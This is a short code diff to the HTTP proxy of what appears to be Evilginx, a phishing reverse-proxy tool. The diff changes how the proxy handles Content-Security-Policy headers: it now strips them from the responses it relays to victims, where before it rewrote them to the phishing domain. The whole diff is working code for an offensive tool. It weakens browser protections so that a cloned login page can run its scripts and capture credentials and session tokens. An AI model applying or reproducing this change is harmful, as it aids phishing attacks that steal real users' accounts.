@@ -935,6 +935,9 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 			trigger := 0
 
 			var rm_headers = []string{
+				"Content-Security-Policy",
+				"X-Content-Security-Policy",
+				"Content-Security-Policy-Report-Only",
 				"X-Permitted-Cross-Domain-Policies",
 				"X-Evilginx",
 				"Cross-Origin-Opener-Policy",
@@ -969,9 +972,6 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 
 			// adapt response headers
 			p.replaceHeaderWithPhished(resp, "Access-Control-Allow-Origin")
-			p.replaceHeaderWithPhished(resp, "X-Content-Security-Policy")
-			p.replaceHeaderWithPhished(resp, "Content-Security-Policy")
-			p.replaceHeaderWithPhished(resp, "Content-Security-Policy-Report-Only")
 			p.replaceHeaderWithPhished(resp, "X-Frame-Options")
 
 			redirect_set := false
